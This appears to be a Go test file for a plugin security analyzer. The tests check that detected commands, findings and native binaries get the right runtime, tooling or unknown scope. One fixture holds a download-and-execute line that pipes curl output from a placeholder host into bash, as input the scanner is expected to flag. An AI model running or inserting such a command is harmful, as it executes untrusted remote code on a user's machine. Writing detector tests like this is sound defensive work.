package analyze

import (
	"testing"

	"github.com/SurreptitiousFabric/plug-and-prejudice/internal/report"
)

func TestOperationScopesSeparateRuntimeToolingAndUnknown(t *testing.T) {
	contents := withValidManifest(map[string][]byte{
		"Runtime.qml":       []byte("Process { command: [\"runtime-command\"] }\nproperty string helper: \"scripts/helper.sh\"\n"),
		"scripts/helper.sh": []byte("#!/bin/sh\nhelper-command\n"),
		"scripts/misc.sh":   []byte("#!/bin/sh\nunknown-command\n"),
		"tests/check.sh":    []byte("#!/bin/sh\ntest-command\n"),
	})
	result := Sources(contents)
	scopes := map[string]report.Scope{}
	for _, operation := range result.Operations {
		scopes[operation.Command] = operation.Scope
	}
	if scopes["runtime-command"] != report.ScopeRuntime || scopes["helper-command"] != report.ScopeRuntime {
		t.Fatalf("runtime scope missing: %#v", scopes)
	}
	if scopes["test-command"] != report.ScopeTooling {
		t.Fatalf("tooling scope missing: %#v", scopes)
	}
	if scopes["unknown-command"] != report.ScopeUnknown {
		t.Fatalf("unproven reachability was guessed: %#v", scopes)
	}
}

func TestFindingInheritsRelatedOperationScope(t *testing.T) {
	result := Sources(withValidManifest(map[string][]byte{
		"Runtime.qml": []byte("Process { command: [\"bash\", \"-c\", \"curl https://example.test/x | bash\"] }\n"),
	}))
	finding := findingByCategory(t, result, "download-and-execute")
	if finding.Scope != report.ScopeRuntime {
		t.Fatalf("finding scope = %q, want runtime: %#v", finding.Scope, finding)
	}
}

func TestRuntimeReachabilityPropagatesThroughInspectableWrapper(t *testing.T) {
	contents := withValidManifest(map[string][]byte{
		"Runtime.qml":  []byte("property string helper: \"bin/launcher\"\n"),
		"bin/launcher": []byte("#!/bin/sh\nexec bin/helper-arm64\n"),
	})
	files := []report.File{{Path: "bin/helper-arm64", Kind: "regular", Binary: &report.Binary{Format: "ELF"}}}
	result := Sources(contents)
	Inventory(files, contents, &result)
	if len(result.Unknowns) != 1 || result.Unknowns[0].Category != "native-binary" {
		t.Fatalf("missing native-binary unknown in %#v", result.Unknowns)
	}
	if result.Unknowns[0].Scope != report.ScopeRuntime {
		t.Fatalf("transitively referenced binary scope = %q, want runtime", result.Unknowns[0].Scope)
	}
}

func TestGitIndexCannotTransitivelyPromoteRuntimeScope(t *testing.T) {
	contents := withValidManifest(map[string][]byte{
		"Runtime.qml": []byte("property int selectedIndex: 0\n"),
		".git/index":  []byte("helper.go\x00"),
		"helper.go":   []byte("package main\n"),
	})
	references := runtimeReferencedPaths(contents, nil, nil)
	if references[".git/index"] || references["helper.go"] {
		t.Fatalf("Git metadata promoted runtime reachability: %#v", references)
	}
}
